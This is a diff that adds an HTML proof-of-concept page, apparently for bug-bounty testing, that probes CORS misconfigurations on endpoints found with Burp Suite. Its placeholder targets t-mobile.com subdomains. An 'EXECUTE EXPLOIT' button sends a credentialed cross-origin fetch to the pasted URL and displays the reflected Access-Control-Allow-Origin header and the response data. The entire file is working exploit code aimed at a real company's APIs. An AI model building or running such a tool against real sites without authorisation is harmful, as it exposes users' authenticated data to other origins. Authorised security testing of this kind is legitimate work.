@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Burp-Linked PoC</title>
+    <style>
+        body { font-family: sans-serif; background: #1a1a1a; color: white; padding: 40px; }
+        .panel { max-width: 800px; margin: auto; background: #2d2d2d; padding: 25px; border-radius: 10px; border-left: 5px solid #e20074; }
+        input, button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; }
+        input { background: #444; color: white; }
+        button { background: #e20074; color: white; font-weight: bold; cursor: pointer; }
+        #res { background: #000; color: #0f0; padding: 15px; font-family: monospace; white-space: pre-wrap; margin-top: 20px; border: 1px solid #444; }
+    </style>
+</head>
+<body>
+
+<div class="panel">
+    <h2 style="color:#e20074">Burp Discovery Tester</h2>
+    <p>Paste the URL you found in Burp Suite:</p>
+    <input type="text" id="url" placeholder="https://subdomain.t-mobile.com/api/v1/..." value="">
+    
+    <label><input type="checkbox" id="creds" checked style="width:auto"> Send Cookies (Credentials)</label>
+    
+    <button onclick="exploit()">EXECUTE EXPLOIT</button>
+
+    <div id="res">Awaiting URL...</div>
+</div>
+
+<script>
+    function exploit() {
+        const url = document.getElementById('url').value;
+        const resBox = document.getElementById('res');
+        const sendCreds = document.getElementById('creds').checked ? 'include' : 'omit';
+
+        resBox.innerText = "Attacking...";
+
+        fetch(url, {
+            method: 'GET', // Try GET first, then change to POST if needed
+            mode: 'cors',
+            credentials: sendCreds
+        })
+        .then(response => {
+            const acao = response.headers.get('Access-Control-Allow-Origin');
+            return response.text().then(text => {
+                resBox.innerText = "STATUS: " + response.status + 
+                                   "\nACAO: " + (acao || "NOT LEAKED") + 
+                                   "\n\nDATA:\n" + text;
+            });
+        })
+        .catch(err => {
+            resBox.innerText = "CORS BLOCK: Server refused to reflect your Origin.";
+        });
+    }
+</script>
+
+</body>
+</html>
